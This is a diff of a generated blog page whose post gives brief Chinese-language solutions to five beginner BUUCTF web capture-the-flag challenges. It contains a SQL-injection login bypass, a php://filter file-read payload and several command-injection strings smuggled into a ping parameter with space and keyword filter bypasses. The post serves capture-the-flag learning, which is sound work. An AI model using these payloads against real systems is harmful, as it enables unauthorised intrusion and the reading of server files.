@@ -13,7 +13,7 @@
   
   <title>
     
-      archive_a: 2026 
+      BUUCTF 
       
       
       |
@@ -108,57 +108,149 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2026</span>
-          </h2>
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">BUUCTF</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-11-03 14:16:44
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/web/" title="web">
+                    #web
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1&#x27; or 1=1 #</span><br><span class="line">密 码： 1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        $cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用get的方式<span class="built_in">cat</span>=dog</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php伪协议主要用来读取文件</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">     └──┬─────────┘ └─────────┬────────┘ └─────┬──────┘</span><br><span class="line">       协议头             过滤器               资源路径</span><br><span class="line">为什么要有base64转码？</span><br><span class="line">flag.php当成一个文件去执行而不是返回文件源码</span><br><span class="line">如果没有转码，直接读取php文件（当作脚本执行）不返回源码 </span><br><span class="line">使用convert.base64-encode的前提是，读取的文件是脚本，反之txt、config无需，但这样有点多余了（直接在url后拼接文件名）</span><br></pre></td></tr></table></figure>
+
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target=127.0.0.1|cat+/f*</span><br><span class="line">请求URL从服务器的文件系统中检索任意文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">相对于上个命令执行添加的过滤条件</span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ls | a=41154;cat $a.sh   #关键字绕过                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# echo $IFS$9              #空格绕过</span><br><span class="line"></span><br><span class="line">GET /?ip=127.0.0.1|ls HTTP/1.1 /?ip=</span><br><span class="line">	flag.php</span><br><span class="line">	index.php</span><br><span class="line">GET /?ip=127.0.0.1|cat$IFS$9index.php HTTP/1.1</span><br><span class="line">	可以看到过滤规则，</span><br><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">	flag</span><br><span class="line">管道符右面是可以执行的命令，赋值不行，；允许变量赋值/?ip=127.0.0.1|a=g;cat$IFS$9fla$a.php</span><br><span class="line">马勒戈壁的，最后的flag在前端里</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-11-03 14:16:44
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/web/" title="web">
+                        #web
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/11/08/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
       
-      <div class="post-item" title="Hello World">
-        <div class="time-m-d">03-11</div>
-        <div class="title">
-          <a href="/2026/03/11/hello-world/">
-            <span>Hello World</span>
-          </a>
-        </div>
-      </div>
+    </div>
     
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2025</span>
-          </h2>
-        </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
       
-      <div class="post-item" title="家庭网络">
-        <div class="time-m-d">11-08</div>
-        <div class="title">
-          <a href="/2025/11/08/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C/">
-            <span>家庭网络</span>
-          </a>
-        </div>
-      </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="BUUCTF">
-        <div class="time-m-d">11-03</div>
-        <div class="title">
-          <a href="/2025/11/03/BUUCTF/">
-            <span>BUUCTF</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         
 <div class="footer">
@@ -416,6 +508,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + BUUCTF + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F11%2F03%2FBUUCTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/11/03/BUUCTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
